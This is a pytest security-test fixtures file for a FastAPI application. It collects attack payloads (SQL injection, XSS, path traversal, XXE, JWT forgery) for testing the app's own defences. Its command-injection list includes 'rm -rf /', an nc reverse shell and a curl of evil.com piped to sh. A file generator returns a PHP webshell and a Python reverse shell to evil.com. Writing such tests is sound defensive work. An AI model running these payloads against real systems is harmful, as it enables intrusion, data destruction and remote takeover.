"""
Security Test Infrastructure for BenGER API
Issue #469: Comprehensive Security Testing Suite

This module provides enhanced fixtures and utilities for security testing,
including attack payloads, vulnerability scanning, and security-specific test helpers.
"""

import statistics
import time
from typing import Dict, List
from unittest.mock import Mock

import jwt
import pytest
from fastapi import Request
from fastapi.testclient import TestClient
from sqlalchemy.orm import Session

from auth_module import create_access_token
from models import User
from user_service import get_password_hash


class SecurityPayloads:
    """Common attack payloads for security testing"""

    SQL_INJECTIONS = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT * FROM users --",
        "admin'--",
        "' OR 1=1--",
        "\" OR \"\"=\"\"",
        "' OR ''='",
        "1' AND '1' HAVING '1'='1",
        "' AND 1=(SELECT COUNT(*) FROM users) AND '1'='1",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin') AND '1'='1",
        "'; exec xp_cmdshell('net user'); --",
        "' WAITFOR DELAY '00:00:05'--",
        "1' AND SLEEP(5)--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<select onfocus=alert('XSS') autofocus>",
        "<textarea onfocus=alert('XSS') autofocus>",
        "<keygen onfocus=alert('XSS') autofocus>",
        "<video><source onerror=\"alert('XSS')\">",
        "<audio src=x onerror=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
        "<marquee onstart=alert('XSS')>",
    ]

    PATH_TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/var/www/../../etc/passwd",
        "C:\\..\\..\\windows\\system32\\config\\sam",
        "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\config\\sam",
    ]

    COMMAND_INJECTIONS = [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| ls -la",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; shutdown -h now",
        "& net user admin admin",
        "| nc -e /bin/sh 10.0.0.1 4444",
        "; curl http://evil.com/backdoor.sh | sh",
        "$(wget http://evil.com/malware -O /tmp/malware)",
    ]

    LDAP_INJECTIONS = [
        "*",
        "*)(uid=*",
        "*)(|(mail=*))",
        "admin*",
        "admin)(|(password=*))",
        "admin)(|(cn=*))",
        "*)(uid=*)(|(uid=*",
        "admin)(&(password=*)(cn=*",
        "*)(objectClass=*",
        "*)(|(objectclass=*))",
    ]

    NOSQL_INJECTIONS = [
        {"$ne": None},
        {"$ne": ""},
        {"$gt": ""},
        {"$regex": ".*"},
        {"$where": "this.password == 'test'"},
        {"$exists": True},
        {"$gte": ""},
        {"$in": ["admin", "user"]},
        {"$nin": []},
        {"$or": [{"username": "admin"}, {"username": "user"}]},
    ]

    XML_INJECTIONS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
        '<![CDATA[<script>alert("XSS")</script>]]>',
    ]

    JWT_ATTACKS = [
        "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",  # Algorithm: none
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.invalid",  # Invalid signature
        "",  # Empty token
        "null",
        "undefined",
        "invalid.token.here",
    ]


class SecurityClient:
    """Enhanced test client for security testing"""

    def __init__(self, base_client: TestClient):
        self.client = base_client
        self.payloads = SecurityPayloads()

    def inject_sql(self, endpoint: str, param: str, payload: str):
        """Test SQL injection vulnerability"""
        return self.client.get(f"{endpoint}?{param}={payload}")

    def inject_xss(self, endpoint: str, data: dict, field: str, payload: str):
        """Test XSS vulnerability"""
        data[field] = payload
        return self.client.post(endpoint, json=data)

    def forge_jwt(self, claims: dict, secret: str = "wrong-secret"):
        """Create forged JWT tokens"""
        return jwt.encode(claims, secret, algorithm="HS256")

    def timing_attack(self, endpoint: str, attempts: int = 100):
        """Measure response times for timing attack detection"""
        times = []
        for i in range(attempts):
            start = time.perf_counter()
            self.client.post(endpoint, json={"email": f"user{i}@test.com"})
            times.append(time.perf_counter() - start)
        return statistics.stdev(times)

    def brute_force(self, endpoint: str, username: str, passwords: List[str]):
        """Attempt brute force attack"""
        results = []
        for password in passwords:
            response = self.client.post(endpoint, json={"username": username, "password": password})
            results.append((password, response.status_code))
        return results

    def check_security_headers(self, response):
        """Check if security headers are present"""
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': ['DENY', 'SAMEORIGIN'],
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000',
            'Content-Security-Policy': None,  # Check if present
            'Referrer-Policy': ['no-referrer', 'strict-origin-when-cross-origin'],
        }

        missing = []
        incorrect = []

        for header, expected_values in required_headers.items():
            if header not in response.headers:
                missing.append(header)
            elif expected_values is not None:
                actual_value = response.headers[header]
                if isinstance(expected_values, list):
                    if not any(v in actual_value for v in expected_values):
                        incorrect.append(
                            f"{header}: expected one of {expected_values}, got {actual_value}"
                        )
                else:
                    if actual_value != expected_values:
                        incorrect.append(
                            f"{header}: expected {expected_values}, got {actual_value}"
                        )

        return {"missing": missing, "incorrect": incorrect}


class MaliciousFileGenerator:
    """Generate malicious files for testing"""

    @staticmethod
    def eicar_test_virus():
        """EICAR test virus signature"""
        return b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

    @staticmethod
    def php_webshell():
        """PHP webshell code"""
        return b"<?php system($_GET['cmd']); ?>"

    @staticmethod
    def python_reverse_shell():
        """Python reverse shell code"""
        return b"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("evil.com",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])"""

    @staticmethod
    def zip_bomb(size_mb: int = 1):
        """Create a zip bomb (compressed file that expands massively)"""
        # Create highly compressible data
        data = b"0" * (size_mb * 1024 * 1024)
        return data

    @staticmethod
    def polyglot_file():
        """File that is valid in multiple formats (potential bypass)"""
        # GIF header + HTML/JS payload
        return b"GIF89a<script>alert('XSS')</script>"

    @staticmethod
    def malicious_pdf():
        """PDF with embedded JavaScript"""
        return b"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]
/Resources << /Font << /F1 << /Type /Font /Subtype /Type1 /BaseFont /Helvetica >> >> >>
/OpenAction << /S /JavaScript /JS (app.alert('XSS');) >> >>
endobj
xref
0 4
0000000000 65535 f 
0000000009 00000 n 
0000000058 00000 n 
0000000115 00000 n 
trailer
<< /Size 4 /Root 1 0 R >>
startxref
344
%%EOF"""


@pytest.fixture
def security_client(client: TestClient) -> SecurityClient:
    """Enhanced client for security testing"""
    return SecurityClient(client)


@pytest.fixture
def malicious_files() -> MaliciousFileGenerator:
    """Generator for malicious test files"""
    return MaliciousFileGenerator()


@pytest.fixture
def attack_payloads() -> SecurityPayloads:
    """Collection of attack payloads"""
    return SecurityPayloads()


@pytest.fixture
def test_users_with_roles(test_db: Session) -> Dict[str, tuple]:
    """Create test users with different roles"""
    users = {}

    roles = [
        ("superadmin", True, "superadmin"),
        ("org_admin", False, "org_admin"),
        ("contributor", False, "contributor"),
        ("annotator", False, "annotator"),
        ("user", False, "user"),
    ]

    for username, is_superadmin, role in roles:
        user = User(
            id=f"{username}-test-id",
            username=username,
            email=f"{username}@test.com",
            hashed_password=get_password_hash("SecurePassword123!"),
            name=f"Test {username.title()}",
            is_active=True,
            is_superadmin=is_superadmin,
            role=role,
        )
        test_db.add(user)
        test_db.commit()

        token = create_access_token(data={"sub": user.email})
        headers = {"Authorization": f"Bearer {token}"}

        users[username] = (user, token, headers)

    return users


@pytest.fixture
def mock_request() -> Request:
    """Mock FastAPI request for testing"""
    request = Mock(spec=Request)
    request.client.host = "192.168.1.1"
    request.headers = {}
    request.url.path = "/api/test"
    request.method = "GET"
    return request


@pytest.fixture
def authenticated_headers(test_db: Session) -> dict:
    """Create authenticated headers for testing"""
    # Create a test user
    user = User(
        id="test-user-security",
        username="securitytest",
        email="security@test.com",
        hashed_password=get_password_hash("SecurePassword123!"),
        name="Security Test User",
        is_active=True,
    )
    test_db.add(user)
    test_db.commit()

    # Create JWT token
    token = create_access_token(data={"sub": user.email})

    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def security_test_data(test_db: Session) -> dict:
    """Create test data for security testing"""
    from models import Organization, Project, Task

    # Create organizations
    org1 = Organization(
        id="org1-test", name="Test Org 1", description="Security test organization 1"
    )
    org2 = Organization(
        id="org2-test", name="Test Org 2", description="Security test organization 2"
    )
    test_db.add_all([org1, org2])

    # Create projects
    project1 = Project(
        id="project1-test", name="Private Project", organization_id=org1.id, visibility="private"
    )
    project2 = Project(
        id="project2-test", name="Public Project", organization_id=org2.id, visibility="public"
    )
    test_db.add_all([project1, project2])

    # Create tasks
    task1 = Task(id="task1-test", name="Private Task", project_id=project1.id, visibility="private")
    task2 = Task(id="task2-test", name="Public Task", project_id=project2.id, visibility="public")
    test_db.add_all([task1, task2])

    test_db.commit()

    return {
        "organizations": [org1, org2],
        "projects": [project1, project2],
        "tasks": [task1, task2],
    }


@pytest.fixture
def vulnerability_scanner():
    """Mock vulnerability scanner for testing"""

    class VulnerabilityScanner:
        def scan_dependencies(self):
            """Mock dependency scanning"""
            return []

        def scan_headers(self, url: str):
            """Mock header scanning"""
            return {"grade": "A", "issues": []}

        def scan_ssl(self, url: str):
            """Mock SSL scanning"""
            return {"grade": "A+", "issues": []}

    return VulnerabilityScanner()
